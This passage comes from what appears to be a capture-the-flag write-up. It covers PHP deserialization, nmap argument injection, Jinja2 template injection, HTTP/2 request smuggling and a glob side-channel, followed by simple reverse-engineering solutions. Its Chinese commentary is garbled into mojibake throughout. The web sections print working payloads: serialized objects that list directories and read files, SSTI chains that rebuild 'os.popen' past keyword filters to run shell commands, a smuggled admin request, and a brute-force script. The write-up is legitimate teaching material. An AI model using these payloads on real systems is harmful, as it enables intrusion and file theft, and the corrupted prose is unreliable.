class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><code>phpinfo()</code>ï¼Œä¿®æ”¹å¼•ç”¨11ä¸º13ï¼š</p><p><code>C:11:%22ArrayObject%22:260:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A13%3B%7D;m:a:0:&#123;&#125;&#125;</code></p><p>ä¿®æ”¹å¼•ç”¨16ä¸º18ï¼Œæ”¹hezä¸ºherï¼š</p><p><code>C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;</code></p><p>æœ€ç»ˆpayloadï¼Œåˆ—ç›®å½•ï¼š</p><p><code>?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=glob://f*</code></p><p>POST: <code>ctf=DirectoryIterator</code></p><p>å¾—åˆ°flagæ–‡ä»¶åä¸º <code>flag_my_baby.php</code>ã€‚</p><p>å†è¯»flagæ–‡ä»¶ï¼š</p><p><code>?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=php://filter/convert.base64-encode/resource=flag_my_baby.php</code></p><p>POST: <code>ctf=SplFileObject</code></p><p>ç»“æœbase64è§£ç å³å¾—flagã€‚</p><p>â€‹</p><h3 id="scan-tool"><a href="#scan-tool" class="headerlink" title="scan_tool"></a>scan_tool</h3><blockquote><p>nmapä¹Ÿå¤ªå¥½ç”¨äº†ï¼ä¸æ˜¯å§ï¼Œä½ è¿˜ä¸ä¼šç”¨å—ï¼Ÿ</p></blockquote><p>è¿‡æ»¤äº† <code>? php flag iL oN</code></p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43801002/article/details/107746582">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</a></p><p>ä½¿ç”¨nmapè¯»æ–‡ä»¶ï¼Œé€‰é¡¹ <code>-oA</code>ï¼Œè¯¥é€‰é¡¹å¯å°†æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§ä¿å­˜ï¼Œåˆ†åˆ«æ”¾åœ¨.nmapï¼Œ.xmlå’Œ.gnmapæ–‡ä»¶ä¸­ã€‚</p><p>ä½¿ç”¨ <code>?ip=127.0.0.1&#39; -i /fl&quot;&quot;ag -oA 1 &#39;</code>ï¼Œå†è®¿é—® <code>1.nmap</code> å¾—åˆ°flagã€‚</p><p>â€‹</p><h3 id="klf-2"><a href="#klf-2" class="headerlink" title="klf_2"></a>klf_2</h3><blockquote><p>â€å¯æ¶ï¼Œæˆ‘ä¸ä¿¡ï¼Œæˆ‘ç»å¯¹ä¸æ˜¯klfï¼Œä½ ä»¬æ‰æ˜¯ï¼Œå“ˆå“ˆè¿™æ¬¡æˆ‘å·åœŸé‡æ¥äº†ï¼Œä½ ä»¬è‚¯å®šæ˜¯klfï¼Œæˆ‘è¦å‘å¥³ç¥è¯æ˜è‡ªå·±â€¦â€œ</p></blockquote><p><code>robots.txt</code> å¾—è·¯ç”± <code>/secr3ttt</code>ï¼Œæµ‹è¯•è¿‡æ»¤å…³é”®å­—æœ‰ï¼š</p><p><code>[ ] _ &#39; &quot; \ config init globals os import request open read 0 137 pop</code></p><p>åˆ—ç›®å½•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4ï¼—)%&#125;</span><br><span class="line">&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagæ–‡ä»¶å <code>fl4gfl4gfl4g</code>ï¼Œå†è¯»flagæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4ï¼—)%&#125;</span><br><span class="line">&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="EZ-Smuggling"><a href="#EZ-Smuggling" class="headerlink" title="EZ_Smuggling"></a>EZ_Smuggling</h3><blockquote><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„H2è½¬H1çš„å°ç½‘ç«™ï¼Œç«™é•¿è®¤ä¸ºä»–å¾ˆå®‰å…¨ï¼Œæ²¡æœ‰äººèƒ½åœ¨ä»–çš„ç½‘ç«™èµ°ç§ä»»ä½•ä¸œè¥¿ã€‚ é¢˜ç›®é“¾æ¥:<a target="_blank" rel="noopener" href="https://47.108.56.168:20231/">https://47.108.56.168:20231/</a> å¤‡ç”¨é“¾æ¥1:<a target="_blank" rel="noopener" href="https://47.108.56.168:20232/">https://47.108.56.168:20232/</a> å¤‡ç”¨é“¾æ¥2:<a target="_blank" rel="noopener" href="https://47.108.56.168:20233/">https://47.108.56.168:20233/</a></p></blockquote><p>H2.CLè¯·æ±‚èµ°ç§ï¼Œå‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://sc.scomurr.com/http-request-smuggling-http-2-downgrade-attack-part-2/">HTTP Request Smuggling â€“ HTTP/2 Downgrade Attack Part 2</a></p><p>æ„é€ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/2</span><br><span class="line">Host: 47.108.56.168:20231</span><br><span class="line">Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 47.108.56.168:20231</span><br><span class="line">Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>å³å¯å¾—flagï¼š<code>SYC&#123;http2_5muggl1ng_15_1nt3r3st1ng&#125;</code>ã€‚</p><p>â€‹</p><h3 id="klf-3"><a href="#klf-3" class="headerlink" title="klf_3"></a>klf_3</h3><blockquote><p>â€å¥½å¥½å¥½è¿™éƒ½ç»™ä½ ä»¬åšå‡ºæ¥äº†ï¼Œè¿™æ¬¡æˆ‘æ‹œæ‰˜äº†pursue0hå¸®æˆ‘æ”¶é›†äº†ä½ ä»¬å‰å‡ æ¬¡çš„payloadï¼Œè¿™æ¬¡ç»å¯¹ä¸å¯èƒ½è®©ä½ ä»¬åšå‡ºæ¥ï¼Œä½ ä»¬ç»å¯¹æ˜¯klfâ€œ</p></blockquote><p><code>robots.txt</code> å¾—åˆ°è·¯ç”± <code>/secr3ttt</code>ï¼ŒåŒklf_2ç›¸åŒæ‰“æ³•å³å¯ã€‚</p><p>åˆ—ç›®å½•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4ï¼—)%&#125;</span><br><span class="line">&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagæ–‡ä»¶å <code>fl4gfl4gfl4g</code>ï¼Œå†è¯»flagæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4ï¼—)%&#125;</span><br><span class="line">&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Akane"><a href="#Akane" class="headerlink" title="Akane!"></a>Akane!</h3><blockquote><p>æœ€é€‚åˆæ¢…è²æ–¯ç‰¹çš„ä¸€é¢˜</p></blockquote><p>globåè®®ä¾§ä¿¡é“çˆ†ç ´æ–‡ä»¶åã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Idol</span>:</span><br><span class="line">    public_Akane=<span class="string">&#x27;glob:///etc/passss&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hoshino</span>:</span><br><span class="line">    public_Ruby=Idol()</span><br><span class="line"></span><br><span class="line">res = res.replace(<span class="string">b&#x27;&quot;Hoshino&quot;:1&#x27;</span>,<span class="string">b&#x27;&quot;Hoshino&quot;:2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(res))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:7:&quot;Hoshino&quot;:1:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125;</span></span><br><span class="line"><span class="comment"># ç»•wakeup</span></span><br><span class="line"><span class="comment"># O:7:&quot;Hoshino&quot;:2:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://zwgadnbkohe7t6xz02urbct9b.node.game.sycsec.com/?tuizi=&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;/var/www/html/The************************.php&#x27;</span></span><br><span class="line">dic = string.printable</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        guess = <span class="string">f&#x27;glob:///var/www/html/The<span class="subst">&#123;name+j&#125;</span><span class="subst">&#123;<span class="string">&quot;*&quot;</span>*(<span class="number">23</span>-<span class="built_in">len</span>(name))&#125;</span>.php&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;O:7:&quot;Hoshino&quot;:2:&#123;&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;&#123;s:5:&quot;Akane&quot;;s:<span class="subst">&#123;<span class="built_in">len</span>(guess)&#125;</span>:&quot;<span class="subst">&#123;guess&#125;</span>&quot;;&#125;&#125;&#125;&#125;&#x27;</span>.encode()</span><br><span class="line">        r = requests.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;base64.b64encode(payload).decode()&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Kurokawa Akane&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            name += j</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># S4crEtF1AgFi1EByo2takuXX</span></span><br></pre></td></tr></table></figure><p>å†è®¿é—® <code>/var/www/html/TheS4crEtF1AgFi1EByo2takuXX.php</code> å³å¯å¾—flagã€‚</p><p>â€‹</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="shiftjmp"><a href="#shiftjmp" class="headerlink" title="shiftjmp"></a>shiftjmp</h3><blockquote><p>è·³åˆ°å“ªé‡Œå»äº†ï¼Ÿ</p></blockquote><p>ç”¨IDAè§£æç¨‹åºå´©æºƒï¼Œæ”¹ç”¨Ghidraè§£æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  uint uStack12;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag:&quot;</span>);</span><br><span class="line">  uStack12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x21</span> &lt; (<span class="type">int</span>)uStack12) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar1 = func_0x00101070();</span><br><span class="line">    <span class="keyword">if</span> ((uVar1 ^ uStack12) != (<span class="type">int</span>)(<span class="type">char</span>)rodata[uStack12]) <span class="keyword">break</span>;</span><br><span class="line">    uStack12 = uStack12 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ä¸ºç®€å•å¼‚æˆ–æ“ä½œï¼Œè¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rodata = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;5358417853366a6438646f547842517b78224d61276373452d7c456c2c6f2f7b5e5c&#x27;</span>))</span><br><span class="line">flag = [rodata[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;W3lc0me_tO_th3_r3veR5e_w0r1d~&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ç‚¹å‡»å°±é€çš„é€†å‘é¢˜"><a href="#ç‚¹å‡»å°±é€çš„é€†å‘é¢˜" class="headerlink" title="ç‚¹å‡»å°±é€çš„é€†å‘é¢˜"></a>ç‚¹å‡»å°±é€çš„é€†å‘é¢˜</h3><blockquote><p>ä»£ç å¦‚ä½•åˆ°å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶?(è®°å¾—å°†å¾—åˆ°çš„æ­£ç¡®å­—ç¬¦ä¸²åŒ…è£¹ä¸ŠSYC{}!!!!!!!)</p></blockquote><p>å°†sæ–‡ä»¶ç¼–è¯‘ï¼š<code>gcc xxx.s -o xxx</code></p><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">strcpy</span>(s2, <span class="string">&quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;</span>);</span><br><span class="line">__isoc99_scanf(&amp;unk_2004, s1);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  s1[i] += <span class="number">7</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ä¸ºROT7ï¼Œcyberchefè¿˜åŸä¸º <code>SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF</code>ã€‚</p><p>flagï¼š<code>SYC&#123;SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF&#125;</code></p><p>â€‹</p><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><blockquote><p>åˆ«æ‹…å¿ƒï¼Œæ²¡å­¦è¿‡çº¿æ€§ä»£æ•°ä¹Ÿå¯ä»¥åšå‡ºæ¥ï¼Œå¬è¯´z3è€å¸ˆå¾ˆå‰å®³ã€‚flagè¯·ä½¿ç”¨SYC{}åŒ…è£¹ã€‚</p></blockquote><p>å‰éƒ¨åˆ†ä»£ç ä¸º $\mathbb{Z}_{32}$ ä¸‹çŸ©é˜µä¹˜æ³•ï¼š$L \cdot M = I$</p><p>åéƒ¨åˆ†ä»£ç ï¼Œæ ¹æ®ä»£ç æµ‹è¯•ä»£ç é€»è¾‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;c01234_asdzxpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">pos = [table.index(flag[i])+<span class="number">48</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))]</span><br><span class="line"><span class="built_in">print</span>(pos)</span><br><span class="line"><span 